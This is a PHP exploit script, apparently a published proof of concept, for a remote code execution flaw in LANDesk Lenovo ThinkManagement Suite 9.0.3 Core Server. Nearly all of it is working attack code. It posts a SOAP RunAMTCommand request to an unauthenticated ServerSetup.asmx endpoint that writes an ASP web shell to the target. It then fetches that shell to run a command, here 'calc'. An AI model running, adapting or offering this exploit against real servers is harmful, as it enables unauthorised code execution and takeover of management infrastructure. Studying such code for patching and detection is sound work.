&lt;?php
/*
LANDesk Lenovo ThinkManagement Suite 9.0.3 Core Server AMTConfig.Business.dll
RunAMTCommand Remote Code Execution Vulnerability
*/
    error_reporting(E_ALL ^ E_NOTICE);    
    set_time_limit(0);
     
    $err[0] = &quot;[!] This script is intended to be launched from the cli!&quot;;
    $err[1] = &quot;[!] You need the curl extesion loaded!&quot;;
 
    if (php_sapi_name() &lt;&gt; &quot;cli&quot;) {
        die($err[0]);
    }
     
    function syntax() {
       print(&quot;usage: php 9sg_landesk.php [ip_address]\r\n&quot; );
       die();
    }
     
    $argv[1] ? print(&quot;[*] Attacking...\n&quot;) :
    syntax();
     
    if (!extension_loaded(&#039;curl&#039;)) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === &#039;WIN&#039;) ? true :
        false;
        if ($win) {
            !dl(&quot;php_curl.dll&quot;) ? die($err[1]) :
             print(&quot;[*] curl loaded\n&quot;);
        } else {
            !dl(&quot;php_curl.so&quot;) ? die($err[1]) :
             print(&quot;[*] curl loaded\n&quot;);
        }
    }
         
    function _s($url, $is_post, $ck, $request) {
        global $_use_proxy, $proxy_host, $proxy_port;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
        }
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            &quot;Cookie: &quot;.$ck ,
            &quot;Content-Type: text/xml; charset=utf-8&quot;,
            &quot;SOAPAction: \&quot;http://tempuri.org/RunAMTCommand\&quot;&quot;     
 
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, &quot;&quot;);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
          
        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.&quot;:&quot;.$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            //die(&quot;[!] &quot;.curl_error($ch).&quot;\n&quot;);
        } else {
            curl_close($ch);
        }
        return $_d;
    }
          $host = $argv[1];
          $port = 80;
 
$shell=&quot;&lt;%\r\n&quot;.
       &quot;Dim WshShell, oExec\r\n&quot;.
       &quot;Set WshShell = CreateObject(\&quot;WScript.Shell\&quot;)\r\n&quot;.
       &quot;Set oExec = WshShell.Exec(\&quot;calc\&quot;)\r\n&quot;.
       &quot;%&gt;\r\n&quot;;
 
$soap=&#039;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soap:Body&gt;
    &lt;RunAMTCommand xmlns=&quot;http://tempuri.org/&quot;&gt;
      &lt;Command&gt;-PutUpdateFileCore&lt;/Command&gt;
      &lt;Data1&gt;aaaa&lt;/Data1&gt;
      &lt;Data2&gt;upl\suntzu.asp&lt;/Data2&gt;
      &lt;Data3&gt;&#039;.htmlentities($shell).&#039;&lt;/Data3&gt;
      &lt;ReturnString&gt;bbbb&lt;/ReturnString&gt;
    &lt;/RunAMTCommand&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;&#039;;
 
$url = &quot;http://$host:$port/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx&quot;;
$out = _s($url, 1, &quot;&quot;, $soap);
print($out.&quot;\n&quot;);
 
sleep(2);
 
$url = &quot;http://$host:$port/upl/suntzu.asp&quot;;
$out = _s($url, 0, &quot;&quot;, &quot;&quot;);
print($out.&quot;\n&quot;);
print(&quot;[*] Now look for calc.exe sub-process...&quot;);
?&gt;
